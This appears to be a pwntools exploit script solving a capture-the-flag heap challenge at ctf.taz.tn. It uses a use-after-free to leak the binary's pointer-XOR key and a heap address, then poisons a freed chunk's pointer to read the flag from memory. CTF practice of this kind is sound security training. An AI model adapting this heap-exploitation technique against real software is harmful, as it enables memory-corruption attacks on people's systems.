from pwn import*
context.arch="amd64"
context.terminal="kitty" #adjust this with ur terminal or comment/remove the line
b="./main"
l = libc = ELF("./libc.so.6")
elf = e = context.binary = ELF(b)
DEBUG=0 # 0 remote , 1 local , 2 local + gdb
nc="nc ctf.taz.tn 10002"
r=nc.split(" ")
if DEBUG==1:
    p=process(b)
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,"""b* main+65

    """)
else:
    p=remote(r[1],int(r[2]),ssl=False)

def add(idx,event=b"\x00",description=b"\x00",day=0,month=0,year=0):
    p.sendlineafter(b"Choose> ",b"1")
    p.sendlineafter(b"Index : \n",str(idx).encode())
    p.sendlineafter(b"Name of the event : ",event)
    p.sendlineafter(b"Description of the event : ",description)
    p.sendlineafter(b"Day: ",str(day).encode())
    p.sendlineafter(b"Month: ",str(month).encode())
    p.sendlineafter(b"Year: ",str(year).encode())


def edit(idx,event=b"\x00",description=b"\x00",day=0,month=0,year=0):
    p.sendlineafter(b"Choose> ",b"2")
    p.sendlineafter(b"Index : \n",str(idx).encode())
    p.sendlineafter(b"name of the event : ",event)
    p.sendlineafter(b"description of the event : ",description)
    p.sendlineafter(b"Day: ",str(day).encode())
    p.sendlineafter(b"Month: ",str(month).encode())
    p.sendlineafter(b"Year: ",str(year).encode())


def delete(idx):
    p.sendlineafter(b"Choose> ",b"3")
    p.sendlineafter(b"Index : ",str(idx).encode())

def view(idx):
    p.sendlineafter(b"Choose> ",b"4")
    p.sendlineafter(b"inspect : ",str(idx).encode())

add(0)
delete(0)
view(0)
p.recvuntil(b"Name of the event : ")
# The binary uses an XOR key on heap metadata. First leak that XOR key:
xorkey = u64(p.recvline()[:-1].ljust(8, b"\x00"))
print(hex(xorkey))

# Perform typical heap choreography to leak an encrypted heap pointer
add(1)
add(2)
delete(1)
delete(2)
view(2)
p.recvuntil(b"Name of the event : ")
leak = u64(p.recvline()[:-1].ljust(8, b"\x00"))
print(hex(leak))

# Recover real heap address by XORing with the xorkey
heapaddr = leak ^ xorkey
print(hex(heapaddr))

# Compute where the flag is stored relative to the heap (reverse-engineered offset)
flagaddr = heapaddr - 0x5b80 - 0x10
# The program stores pointers xored with the key, so xor the flag addr back
xordflagaddr = flagaddr ^ xorkey
print(hex(xordflagaddr))

# Overwrite an entry's name pointer to point to the xored flag address
edit(2, p64(xordflagaddr))
view(2)

# Create entries so that the overwritten pointer will be used and the flag printed
add(3)
add(4, b"", b"")
view(4)

p.interactive()
